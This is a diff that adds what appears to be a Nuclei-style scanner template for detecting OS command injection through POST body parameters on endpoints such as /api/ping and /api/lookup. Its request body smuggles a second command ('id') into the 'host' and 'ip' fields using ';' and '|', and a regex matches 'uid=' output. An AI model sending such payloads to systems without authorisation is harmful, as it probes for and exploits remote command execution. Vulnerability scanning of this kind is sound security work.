@@ -1,0 +1,25 @@
+id: m7-cmdi-post
+info:
+  name: M7 - CMDi via POST Body Parameters
+  author: Sharlix
+  severity: critical
+  description: OS command injection via POST body
+  tags: cmdi,post,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/ping"
+      - "{{BaseURL}}/api/test"
+      - "{{BaseURL}}/network/check"
+      - "{{BaseURL}}/api/lookup"
+
+    body: "host=127.0.0.1;id&ip=127.0.0.1|id"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
